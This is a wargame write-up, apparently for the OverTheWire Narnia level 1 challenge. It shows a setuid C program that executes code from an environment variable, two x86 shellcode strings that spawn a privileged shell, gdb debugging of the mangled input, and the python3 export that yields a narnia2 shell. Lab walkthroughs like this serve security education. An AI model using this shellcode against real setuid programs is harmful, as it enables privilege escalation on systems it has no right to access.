+++
title = "narnia1"
date = "2026-02-10"
draft = false
+++

lets login to narnia1 and see what’s the source code.

```c
#include 

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

I’ve always had difficulty reading C syntax, especially this line: `int (ret*)();`

The way I read it is `ret is a pointer to a function returning an int`.

Next, ret is being assigned this value from an environment variable `EGG` and then executed `ret()`.

This looks erriely like those stub functions which take a shellcode as a char buffer and then load them to a function pointer type to execute.
For instance, an example is: [https://www.exploit-db.com/exploits/39625](https://www.exploit-db.com/exploits/39625)

Armed with this knowledge, I was stuck on how to export it onto an environment variable. For instance, if I were to set the environment variable as:\

```shell
export EGG="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
```

By the way, the above [shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html) was selected after some thought. Basically, if a new shell has to be spawned from the environment variable, it has to carry over the `euid` bit which does not happen if the `-p` param is not supplied and `uid > 100`.

I was straight up getting core dump

```shell
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault (core dumped)
```

`gdb` to the rescue!
Disassembly as follows:

```shell
narnia1@narnia:/narnia$ export EGG="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
narnia1@narnia:/narnia$ gdb -q ./narnia1
...
(gdb) disassemble main
Dump of assembler code for function main:
   0x08049186 :     push   ebp
   0x08049187 :     mov    ebp,esp
   0x08049189 :     sub    esp,0x4
   0x0804918c :     push   0x804a008
=> 0x08049191 :    call   0x8049040 
   0x08049196 :    add    esp,0x4
   0x08049199 :    test   eax,eax
   0x0804919b :    jne    0x80491b1 
   0x0804919d :    push   0x804a00c
   0x080491a2 :    call   0x8049050 
   0x080491a7 :    add    esp,0x4
   0x080491aa :    push   0x1
   0x080491ac :    call   0x8049060 
   0x080491b1 :    push   0x804a041
   0x080491b6 :    call   0x8049050 
   0x080491bb :    add    esp,0x4
   0x080491be :    push   0x804a008
   0x080491c3 :    call   0x8049040 
   0x080491c8 :    add    esp,0x4
   0x080491cb :    mov    DWORD PTR [ebp-0x4],eax
   0x080491ce :    mov    eax,DWORD PTR [ebp-0x4]
   0x080491d1 :    call   eax
   0x080491d3 :    mov    eax,0x0
   0x080491d8 :    leave
   0x080491d9 :    ret
```

I put a breakpoint at `*main+11` where the call to getenv is taking place. Executing this syscall and then checking the `eax` register shows the issue. Why eax? Because its the accumulator register which stores the results.

```shell
(gdb) x/30bx $eax
0x804909d :  0xe9    0xe4    0x00    0x00    0x00    0x66    0x90    0x66
0x80490a5 :      0x90    0x66    0x90    0x66    0x90    0x66    0x90    0x66
0x80490ad :     0x90    0x66    0x90    0xc3    0x66    0x90    0x66    0x90
0x80490b5:      0x66    0x90    0x66    0x90    0x66    0x90
(gdb) ni
```

Seems the shellcode is mangled with the backslashed embedded as raw bytes `0x5c` when we set the envvar to a string. So maybe… we need to set to it raw bytes of the shellcode such that its picked up and executed.

python3 to the rescue…

```shell
(gdb) set environment EGG=`python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"`
```

Now, lets inspect `eax`

```shell
narnia1@narnia:/narnia$ export EGG=`python3 -c "import sys; sys.stdout.buffer.write(b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')"`
...
(gdb) x/33bx $eax
```

Look at above, our beautiful shellcode intact `^~^`
Let’s continue the program execution…

```shell
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
bash-5.2$ whoami
narnia2
```
